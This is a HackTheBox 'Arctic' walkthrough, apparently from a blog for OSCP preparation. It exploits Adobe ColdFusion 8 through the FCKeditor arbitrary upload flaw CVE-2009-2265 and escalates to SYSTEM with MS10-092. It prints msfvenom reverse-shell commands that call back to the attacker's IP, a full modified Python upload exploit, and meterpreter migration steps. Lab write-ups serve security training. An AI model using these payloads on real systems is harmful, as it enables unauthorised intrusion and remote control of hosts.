---
title: HackTheBox - Arctic
date: 2021-08-13 20:58:31 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [fmtp, Adobe ColdFusion, FCKeditor, CVE-2009-2265, JSP, msfvenom, metasploit, meterpreter, shell to meterpreter, multi_handler, suggester, MS10-092, htb-windows-easy, writeup, oscp-prep]
image: /assets/img/htb/machines/windows/easy/arctic/Arctic.png
---

## Enumeration

### `nmap` scan

```bash
$ nmap -sV -sC -p- -oN Arctic-full-port-scan.txt 10.10.10.11
Nmap scan report for 10.10.10.11
Host is up (0.10s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Port 8500 (fmtp)

The port 8500 is running **FMTP**. It takes about 20-30 seconds to perform every request, so we have to wait a little bit before seeing two folders: `CFIDE` and `cfdocs`.

![](/assets/img/htb/machines/windows/easy/arctic/8500.png)

If we go to the `administrator` folder in `CFIDE`, a page is loading with **ColdFusion 8** written:

![ColdFusion 8](/assets/img/htb/machines/windows/easy/arctic/ColdFusion.png)

If we take a look at `searchsploit`, we can see there are many exploits available:

![](/assets/img/htb/machines/windows/easy/arctic/searchsploit.png)

## Foothold

Most of the scripts are cross-site scripting but there is a particular script than abuses a RCE vulnerability: 

```
Adobe ColdFusion 8 - Remote Command Execution (RCE)                     | cfm/webapps/50057.py
```

Let's get this script:

```bash
$ searchsploit -m cfm/webapps/50057.py
  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/htb/machines/Windows/Arctic/50057.py
```

The exploit is essentially doing three things: 

1. It generates a **JSP** (JavaServer Pages) reverse shell file with `msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp` 
2. Afterward, it sends it via an arbitrary file upload vulnerability in FCKeditor (**[CVE-2009-2265](https://www.codewatch.org/blog/?p=299)**) at this URL: `http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00`
3. Then, it executes this JSP malicious file by opening the following URL: `http://{rhost}:{rport}/userfiles/file/{filename}.jsp`

We just have to edit these information:

![](/assets/img/htb/machines/windows/easy/arctic/exploit_modif.png)

Finally, we can execute the exploit, wait a little and we have a shell as `tolis`:

```bash
$  python3 50057.py
```

![](/assets/img/htb/machines/windows/easy/arctic/shell.png)

## User (tolis)

```cmd
C:\ColdFusion8\runtime\bin>cd C:\Users\tolis
C:\Users\tolis>cd Desktop
C:\Users\tolis\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\tolis\Desktop

22/03/2017  10:00     <DIR>          .
22/03/2017  10:00     <DIR>          ..
22/03/2017  10:01                 32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  33.183.985.664 bytes free

C:\Users\tolis\Desktop>type user.txt
02650d3a69a70780c302e146a6cb96f3
C:\Users\tolis\Desktop>systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 
System Boot Time:          15/8/2021, 1:39:13 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 200 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.234 MB
Virtual Memory: In Use:    813 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

## Privesc

### Shell to Meterpreter 

I wanted to upgrade my shell so I used `msfvenom` and `mutli/handler` from **Metasploit**:

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(vpnip) LPORT=8500 -f exe > meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

![](/assets/img/htb/machines/windows/easy/arctic/meter.png)

#### File transfer

In order to transfer the file `meterpreter.exe`  I tried many techniques such as running an **SMB** server or using **PowerShell** but each time I failed. Then I modified the exploit script to post and upload `meterpreter.exe`:

```python
# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
# Google Dork: intext:"adobe coldfusion 8"
# Date: 24/06/2021
# Exploit Author: Pergyz
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: 8
# Tested on: Microsoft Windows Server 2008 R2 Standard
# CVE : CVE-2009-2265

#!/usr/bin/python3

from multiprocessing import Process
import io
import mimetypes
import os
import urllib.request
import uuid

class MultiPartForm:

    def __init__(self):
        self.files = []
        self.boundary = uuid.uuid4().hex.encode('utf-8')
        return

    def get_content_type(self):
        return 'multipart/form-data; boundary={}'.format(self.boundary.decode('utf-8'))

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()

        if mimetype is None:
            mimetype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream')

        self.files.append((fieldname, filename, mimetype, body))
        return

    @staticmethod
    def _attached_file(name, filename):
        return (f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n').encode('utf-8')

    @staticmethod
    def _content_type(ct):
        return 'Content-Type: {}\r\n'.format(ct).encode('utf-8')

    def __bytes__(self):
        buffer = io.BytesIO()
        boundary = b'--' + self.boundary + b'\r\n'

        for f_name, filename, f_content_type, body in self.files:
            buffer.write(boundary)
            buffer.write(self._attached_file(f_name, filename))
            buffer.write(self._content_type(f_content_type))
            buffer.write(b'\r\n')
            buffer.write(body)
            buffer.write(b'\r\n')

        buffer.write(b'--' + self.boundary + b'--\r\n')
        return buffer.getvalue()

def execute_payload():
    print('\nExecuting the payload...')
    print(urllib.request.urlopen(f'http://{rhost}:{rport}/userfiles/file/{filename}.jsp').read().decode('utf-8'))

if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.12'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = "meterpreter" # uuid.uuid4().hex

    # Encode the form data
    form = MultiPartForm()
    form.add_file('newfile', filename + '.txt', fileHandle=open(filename + '.exe', 'rb'))
    data = bytes(form)

    # Create a request
    request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.exe%00', data=data)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Content-length', len(data))

    # Send the request and print the response
    print('\nSending request and printing response...')
    print(urllib.request.urlopen(request).read().decode('utf-8'))
    
    # Print some information
    print('\nPrinting some information for debugging...')
    print(f'lhost: {lhost}')
    print(f'rhost: {rhost}')
    print(f'rport: {rport}')
    print(f'payload: {filename}.exe')
```

I looked for the file and it was located in `C:\ColdFusion8\wwwroot\userfiles\file\`. I executed it and got a **meterpreter session**:

![](/assets/img/htb/machines/windows/easy/arctic/meterpreter_session.png).

YES!

### `local_exploit_suggester`

First, let's take a look at `sysinfo`:

![](/assets/img/htb/machines/windows/easy/arctic/sysinfo.png)

Okay so we need to migrate to another process because we want to switch to a x64 version of meterpreter:

```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User          Path
 ---   ----  ----                     ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 12    480   spoolsv.exe
 236   4     smss.exe
 276   480   svchost.exe
 328   308   csrss.exe
 372   308   wininit.exe
 388   380   csrss.exe
 412   1176  cmd.exe                  x64   0        ARCTIC\tolis  C:\Windows\System32\cmd.exe
 436   380   winlogon.exe
 480   372   services.exe
 496   372   lsass.exe
 504   372   lsm.exe
 604   480   svchost.exe
 680   480   svchost.exe
 756   436   LogonUI.exe
 764   480   svchost.exe
 808   480   svchost.exe
 864   480   svchost.exe
 904   480   svchost.exe
 944   480   svchost.exe
 1040  480   CF8DotNetsvc.exe
 1060  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 1084  1040  JNBDotNetSide.exe
 1100  328   conhost.exe
 1124  4028  met_shell.exe            x86   0        ARCTIC\tolis  C:\ColdFusion8\wwwroot\userfiles\file\met_shell.exe
 1148  480   jrunsvc.exe              x64   0        ARCTIC\tolis  C:\ColdFusion8\runtime\bin\jrunsvc.exe
 1176  1148  jrun.exe                 x64   0        ARCTIC\tolis  C:\ColdFusion8\runtime\bin\jrun.exe
 1184  480   swagent.exe
 1192  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 1196  1176  cmd.exe                  x64   0        ARCTIC\tolis  C:\Windows\System32\cmd.exe
 1228  480   swstrtr.exe
 1236  1228  swsoc.exe
 1244  328   conhost.exe
 1312  480   k2admin.exe
 1456  480   svchost.exe
 1492  480   VGAuthService.exe
 1752  480   vmtoolsd.exe
 1776  480   ManagementAgentHost.exe
 1996  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 2036  604   WmiPrvSE.exe
 2128  480   dllhost.exe
 2240  1312  k2server.exe
 2248  328   conhost.exe
 2352  1124  powershell.exe           x86   0        ARCTIC\tolis  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 2444  1312  k2index.exe
 2460  328   conhost.exe
 2896  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 2964  480   svchost.exe
 3092  412   powershell.exe           x64   0        ARCTIC\tolis  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 3144  480   msdtc.exe
 3404  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 3548  1124  powershell.exe           x86   0        ARCTIC\tolis  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 3776  480   sppsvc.exe
 3880  1176  cmd.exe                  x64   0        ARCTIC\tolis  C:\Windows\System32\cmd.exe
 3912  1196  powershell.exe           x64   0        ARCTIC\tolis  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 3920  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe

meterpreter > migrate 3920
[*] Migrating from 1124 to 3920...
[*] Migration completed successfully.
```

Let's check `sysinfo` again:

![](/assets/img/htb/machines/windows/easy/arctic/sysinfo2.png)

We're good! Hit `Ctrl+Z` to background the session and use `post/multi/recon/local_exploit_suggester`.

We can use `exploit/windows/local/ms10_092_schelevator` to escalate and get **SYSTEM**:

![](/assets/img/htb/machines/windows/easy/arctic/SYSTEM.png)

![](/assets/img/htb/machines/windows/easy/arctic/root.png)

___

## Useful links

- [SecWiki - windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
- [WindowsExploits by abatchy](https://github.com/abatchy17/WindowsExploits)
- [Microsoft Security Bulletin MS10-092 - Important Vulnerability in Task Scheduler Could Allow Elevation of Privilege](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/MS10-092)